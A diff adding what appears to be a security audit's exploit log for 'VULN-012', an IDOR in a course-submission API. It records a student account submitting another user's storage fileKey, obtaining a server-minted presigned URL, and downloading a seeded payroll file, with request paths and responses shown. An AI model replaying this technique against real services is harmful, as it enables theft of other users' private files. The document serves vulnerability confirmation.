@@ -1,0 +1,18 @@
+========================================================================
+VULN-012: Submission file-answer presign IDOR (presigned download of any client-supplied fileKey)
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] enrichFileUploadAnswersArray (submission.ts:175-206) presigns answerData.fileKey verbatim
+[INFO] no ownership/per-submitter check; findUnauthorizedDownloadKeys is not wired into this path
+[SETUP] course=6b5e32ad-dd40-4d9a-9f4e-3c719f16c291 exercise=fbbe91ef-33f5-4db2-9166-40bc3c785907 fileQuestion=24
+[SETUP] seeded victim object: documents/11111111-1111-4111-8111-111111111111/lecture_772cdc52-payroll.pdf  (marker embedded)
+[SETUP] attacker student 96be91bd-fbec-4b24-814e-d8ed63fbcba3 enrolled in the course (never uploaded that object)
+[STEP] attacker POST /course/6b5e32ad-dd40-4d9a-9f4e-3c719f16c291/exercise/fbbe91ef-33f5-4db2-9166-40bc3c785907/submission  fileKey=<victim documents key>
+[INFO]   submit -> HTTP 201 {"success":true,"data":{"id":"03ab91e4-569a-4fca-aa50-bc57448fe7c6","reviewerId":null,"statusId":2,"gradingState":"await
+[STEP] attacker GET /course/6b5e32ad-dd40-4d9a-9f4e-3c719f16c291/exercise/fbbe91ef-33f5-4db2-9166-40bc3c785907/submissions
+[INFO]   minted fileUrl present: True
+[STEP] attacker GET http://localhost:21528/documents/11111111-1111-4111-8111-111111111111/lecture_772cdc52-payroll.pdf?<presigned>
+[INFO]   download -> HTTP 200, 66 bytes
+[PROOF] attacker downloaded the exact seeded secret of documents/11111111-1111-4111-8111-111111111111/lecture_772cdc52-payroll.pdf (a foreign object they never uploaded) via a presigned URL the server minted from their own attacker-supplied fileKey
+==> VULN-012: CONFIRMED — arbitrary fileKey in a submission answer yields a working presigned download
+[OK] exploit confirmed — object-storage IDOR via unvalidated submission fileKey
